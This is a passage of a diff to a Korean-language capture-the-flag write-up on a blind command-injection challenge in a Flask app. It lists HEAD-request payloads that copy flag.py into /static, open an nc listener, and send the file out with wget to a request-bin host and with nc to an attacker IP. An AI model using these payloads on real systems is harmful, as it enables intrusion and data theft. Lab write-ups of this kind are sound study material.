@@ -202,13 +202,69 @@ HEAD /?cmd=wget+https://dzmnkob.request.dreamhack.games/?query="$(cat+flag.py)" 
 
 <img width="600" alt="image" src="https://github.com/user-attachments/assets/004127bd-cb3e-450e-89b3-291b0949390e">
 
+# 2. Static File Directory
 
+`flask`를 포함한 다양한 프레임워크 또는 웹 에플리케이션에서는, 여러 정적 리소스를 다루기 위해 **Static File Directory**로 `/static` 경로를 사용한다.
 
+따라서, `HEAD` 메서드를 통해 아래의 명령어를 전달해준 후, `/static/flag_result.txt`에 접근하면 해당 정적 리소스를 출력할 수 있을 것이다.
 
+```
+mkdir static; cat flag.py > static/flag_result.txt
+```
 
+위 명령어는 먼저 **Static File Directory`인 `/static` 디렉토리를 만들어주고, 해당 디렉토리의 `flag_result.txt` 파일에 `>` 메타 문자를 통해 `cat flag.py`의 출력결과를 저장해준다.
 
+참고로, `>>`은 파일의 맨끝에 추가해주는 메타 문자이며, `flag_result.txt` 파일이 존재하지 않으면 자동으로 생성해준다.
 
+그럼 아래와 같은 페이로드를 전달해주면 된다.
 
+```
+HEAD /?cmd=mkdir+static;cat+flag.py>static/flag_result.txt HTTP/1.1
+```
 
+페이로드를 전달해준 후, `http://host3.dreamhack.games:10383/static/flag_result.txt` URL로 들어가게 되면, **Static File Directory**에 존재하는 파일에 접근하기 때문에, 
 
+`flag_result.txt` 파일의 내용이 아래와 같이 웹 페이지에 출력되는 것을 확인할 수 있다.
 
+<img width="591" alt="image" src="https://github.com/user-attachments/assets/0df909ae-6abd-4bcf-9dbb-117eed272b27">
+
+`flask`에는 **Static File Directory**로 `/static` 경로를 사용하기 때문에, `/static`이 아닌 다른 이름의 디렉토리를 생성하여 접근하면, 파일을 출력해주지 않는 것을 주의하자.
+
+# 3. Bind Shell
+
+위 방법은 서버의 특정 port를 열어 공격자가 접속하는 방법이다. [링크](https://velog.io/@buaii/blind-command)의 풀이를 참고하였다.
+
+```
+nc -lvp [portnum]
+```
+
+위와 같은 명령어를 수행하도록 시스템 함수에 전달해주면 된다.
+
+그럼 간단하게 아래의 페이로드를 보내면 될 것이다.
+
+```
+HEAD /?cmd=nc+-lvp+[portnum] HTTP/1.1
+```
+
+공격대상 서버에 해당 payload로 port를 열고 공격자가 접속을 하면 되지만, 이 문제에서는 특정 포트를 열어도 포트포워딩 설정을 할 수 없어 bind shell로는 결과를 알 수 없다고 한다.
+
+이 부분은 다음에 한번 다시 공부해보자.
+
+# 4. Reverse Shell
+
+위 방법은 공격자가 특정 port를 열어 서버가 접속하도록 하는 방법이다.
+
+```
+cat flag.py | nc [myIP] [portnum]
+```
+
+위와 같은 명령어를 수행하도록 시스템 함수에 전달해주면 된다.
+
+그럼 간단하게 아래의 페이로드를 보내면 될 것이다.
+```
+HEAD /?cmd=cat+flag.py|nc+[myIP]+[portnum] HTTP/1.1
+```
+
+로컬에서 포트를 열어주고 서버를 연결시켜보면 플래그가 전송되는 것을 확인할 수 있다고 한다.
+
+이 부분도 다음에 한번 다시 공부해보자.
